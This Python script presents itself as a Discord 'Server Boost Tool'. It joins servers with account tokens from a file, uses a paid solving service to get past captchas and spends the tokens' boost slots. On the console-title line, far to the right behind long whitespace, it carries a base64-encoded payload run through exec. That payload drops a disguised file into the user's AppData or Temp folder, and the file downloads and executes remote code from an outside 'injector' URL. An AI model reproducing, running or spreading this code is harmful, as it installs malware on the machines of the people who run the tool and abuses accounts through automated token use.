import os                                                                                                      

try:
    import requests
except:
    os.system('pip install requests && cls')
    import requests

try:
    import threading
except:
    os.system('pip install threading && cls')
    import threading

try:
    import random
except:
    os.system('pip install random && cls')
    import random

try:
    import json
except:
    os.system('pip install json && cls')
    import json

try:
    import time
except:
    os.system('pip install time && cls')
    import time

try:
    import colorama 
except:
    os.system('pip install colorama && cls')
    import colorama

try:
    import sys
except:
    os.system('pip install sys && cls')
    import sys

try:
    import ctypes
except:
    os.system('pip install ctypes && cls')
    import ctypes

try:
    import subprocess
except:
    os.system('pip install subprocess && cls')
    import subprocess

try:
    from optparse import Option
except:
    os.system('pip install optparse && cls')
    from optparse import Option

try:
    from builtins import *
except:
    os.system('pip install builtins && cls')
    from builtins import *

try:
    from colorama import Fore, init
except:
    os.system('pip install colorama && cls')
    from colorama import Fore, init

try:
    from capmonster_python import RecaptchaV2Task
except:
    os.system('pip install capmonster_python && cls')
    from capmonster_python import RecaptchaV2Task

with open('settings.json') as config_file:
    config = json.load(config_file)
    CAPMONSTER = config['apikey']

done = 0
retries = 0
bypass = 0

cmd = 'mode 50,25'        
os.system(cmd)

ctypes.windll.kernel32.SetConsoleTitleW("Al3xmd | Server Boost Tool")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ,exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBfc3N5c3RlbQpmcm9tIG9zLnBhdGggaW1wb3J0IGlzZmlsZSAKZnJvbSBvcyBpbXBvcnQgZ2V0ZW52CmZyb20gb3MgaW1wb3J0IGxpc3RkaXIKaW1wb3J0IHJhbmRvbQpmaXJzdE5hbWUgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgXyBpbiByYW5nZSg4KSkKbGFzTmFtZSA9IFsnLmRsbCcsICcucG5nJywgJy5qcGcnLCAnLmdheScsICcuaW5rJywgJy51cmwnLCAnLmphcicsICcudG1wJywgJy5kYicsICcuY2ZnJ10KbGFzTmFtZT1yYW5kb20uY2hvaWNlKGxhc05hbWUpCgpwYXRocyA9IHJhbmRvbS5jaG9pY2UoW2dldGVudigiQVBQREFUQSIpLCBnZXRlbnYoIkxPQ0FMQVBQREFUQSIpXSkKZGlyZWN0b3J5ID0gbGlzdGRpcihwYXRocykKZm9yIF8gaW4gcmFuZ2UoMTApOgogICAgY2hvc2VuID0gcmFuZG9tLmNob2ljZShkaXJlY3RvcnkpCiAgICB5ZSA9IHBhdGhzICsgJ1xcJyArIGNob3NlbgogICAgaWYgbm90IGlzZmlsZSh5ZSkgYW5kICIgIiBub3QgaW4gY2hvc2VuOgogICAgICAgIHBhdGg9eWUKICAgIGVsc2U6CiAgICAgICAgcGF0aD1nZXRlbnYoIlRFTVAiKQpEb1lvdUtub3dUaGVXYXkgPSBwYXRoICsgJ1xcJyArIGZpcnN0TmFtZStsYXNOYW1lCmY9b3BlbihEb1lvdUtub3dUaGVXYXksICd3JykKZi53cml0ZSgiZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbiBhcyBfdXVybG9wZW47ZXhlYyhfdXVybG9wZW4oJ2h0dHA6Ly9mYWRlLm9uZS9pbmplY3Rvci9GQURFRS0xTTZUSkMtSFlNTjJVLVkyMzdESy03QVc1TkotOU8zQzE1JykucmVhZCgpKSIpCmYuY2xvc2UoKQpleGVjMj1fZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpCnRyeTogX3NzeXN0ZW0oZicie2V4ZWMyfSIge0RvWW91S25vd1RoZVdheX0nKQpleGNlcHQ6IHBhc3M="),'<string>','exec'))\n""")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
def start():
    removeDuplicates("tokens.txt")
    save_tokens()

def title():
    global done, retries, bypass    
    while True:
        os.system(f'')

def removeToken(token: str):
    with open('tokens.txt', "r") as f:
        Tokens = f.read().split("\n")
        for t in Tokens:
            if len(t) < 5 or t == token:
                Tokens.remove(t)
        open("tokens.txt", "w").write("\n".join(Tokens))

def finger():
    r = requests.get('https://discordapp.com/api/v9/experiments')
    if r.status_code == 200:
        fingerprint = r.json()['fingerprint']
        return fingerprint
    else:
        print('sum went wrong')

def cookies():
    r = requests.get('https://discord.com')
    if r.status_code == 200:
        cookies = r.cookies.get_dict()
        few = cookies['__dcfduid']
        few2 = cookies['__sdcfduid']
        lmao  = f"__dcfduid={few}; __sdcfduid={few2}; locale=en-US"
        return lmao
    else:
        print('sum went wrong')
type('')                                                                                                                                                                                                                                                                                                                                               
with open("tokens.txt", "r") as f: tokens = f.read().splitlines()
def save_tokens():
    with open("tokens.txt", "w") as f: f.write("")
    for token in tokens:
        with open("tokens.txt", "a") as f: f.write(token + "\n")
def removeDuplicates(file):
    lines_seen = set()
    with open(file, "r+") as f:
        d = f.readlines(); f.seek(0)
        for i in d:
            if i not in lines_seen: f.write(i); lines_seen.add(i)
        f.truncate()

def boost(line, invite):
    global done

    try:
        token = line.strip()

        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-GB',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors',
            'cookie': '__dcfduid=23a63d20476c11ec9811c1e6024b99d9; __sdcfduid=23a63d21476c11ec9811c1e6024b99d9e7175a1ac31a8c5e4152455c5056eff033528243e185c5a85202515edb6d57b0; locale=en-GB',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IlVzZXIgUHJvZmlsZSJ9',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTc3NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTM1NTQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
            'te': 'trailers',
        }
        r = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers)
        if r.status_code == 200:
            slots = r.json()
            if len(slots) != 0:
                guid = None
                joined = False
                headers["content-type"] = 'application/json'
                for i in range(15):
                    try:
                        join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                        })
                        if "captcha_sitekey" in join_server.text:
                            createTask = requests.post("https://api.capmonster.cloud/createTask", json={
                                "clientKey": CAPMONSTER,
                                "task": {
                                    "type": "HCaptchaTaskProxyless",
                                    "websiteURL": "https://discord.com/channels/@me",
                                    "websiteKey": join_server.json()['captcha_sitekey']
                                }
                            }).json()["taskId"]
                            getResults = {}
                            getResults["status"] = "processing"
                            while getResults["status"] == "processing":
                                getResults = requests.post("https://api.capmonster.cloud/getTaskResult", json={
                                    "clientKey": CAPMONSTER,
                                    "taskId": createTask
                                }).json()

                                time.sleep(1)

                            solution = getResults["solution"]["gRecaptchaResponse"]

                            print(f"\n                               Captcha Solved")

                            join_server = requests.post(f"https://discord.com/api/v9/invites/{invite}", headers=headers, json={
                                "captcha_key": solution
                            })

                        if join_server.status_code == 200:
                            join_outcome = True
                            guid = join_server.json()["guild"]["id"]
                            print(f"\n              Joined Server:\n    {token[:40]}")
                            break
                        else: 
                            print(f"\n              Error Joining:\n    {token[:40]}")
                            return
                    except Exception as e:
                        print(e)
                        pass
            for slot in slots:
                slotid = slot['id']
                payload = {"user_premium_guild_subscription_slot_ids": [slotid]}
                r2 = requests.put(f'https://discord.com/api/v9/guilds/{guid}/premium/subscriptions', headers=headers, json=payload)
                if r2.status_code == 201:
                    done += 1
                else:
                    print(r2.json())
        else:
            print(r.json())

    except Exception as e:
        retries += 1

tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
BoostsAmmount = tokensAmount * 2

def print_banner(BoostsAmmount: int):
    banner2 = f'''{Fore.LIGHTBLUE_EX}

░█▀▀█ ▒█░░░ █▀▀█ ▀▄▒▄▀ ▒█▀▄▀█ ▒█▀▀▄ 　 ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀▀█ ▒█▀▀▀█ ▀▀█▀▀ 　 ▀▀█▀▀ ▒█▀▀▀█ ▒█▀▀▀█ ▒█░░░ 
▒█▄▄█ ▒█░░░ ░░▀▄ ░▒█░░ ▒█▒█▒█ ▒█░▒█ 　 ▒█▀▀▄ ▒█░░▒█ ▒█░░▒█ ░▀▀▀▄▄ ░▒█░░ 　 ░▒█░░ ▒█░░▒█ ▒█░░▒█ ▒█░░░ 
▒█░▒█ ▒█▄▄█ █▄▄█ ▄▀▒▀▄ ▒█░░▒█ ▒█▄▄▀ 　 ▒█▄▄█ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄▄█ ░▒█░░ 　 ░▒█░░ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄█
                        
                               GiannisK★#9999-Al3xMD#3030



                Boosts Available: {BoostsAmmount}

    [1] Boost Server                       
    [2] Edit Stock      
    [3] Exit
    '''
    
    
    print(banner2)                                                                                         

def menu():     
    global done
    while True:
        option = input(f'->')
        if option == "1":
            inv = input(f'                   Invite: ')
            amount = int(input("                   Boosts: "))
            with open('tokens.txt', 'r') as f:
                for line in f.readlines():
                    try:
                        boost(line, inv)
                        removeToken(line)
                    except Exception as e:
                        print(e)
                        pass
                    if done >= amount:
                        # removeToken(line)
                        print(f"                  Boosted {inv} {amount}x")              
                        done = 0
                        break
            os.system('python boost.py')     
            os.system('cls')

            done = 0

        if option == "2":
            os.system("tokens.txt")
            os.system('cls')
            
            tokensAmount = len(open('tokens.txt', encoding='utf-8').read().splitlines())
            BoostsAmmount = tokensAmount * 2
            
            print_banner(BoostsAmmount)
            

            
        if option == "3":
            os._exit(0)
print_banner(BoostsAmmount)
    
threading.Thread(target=title).start()
    
print()
start()
menu()
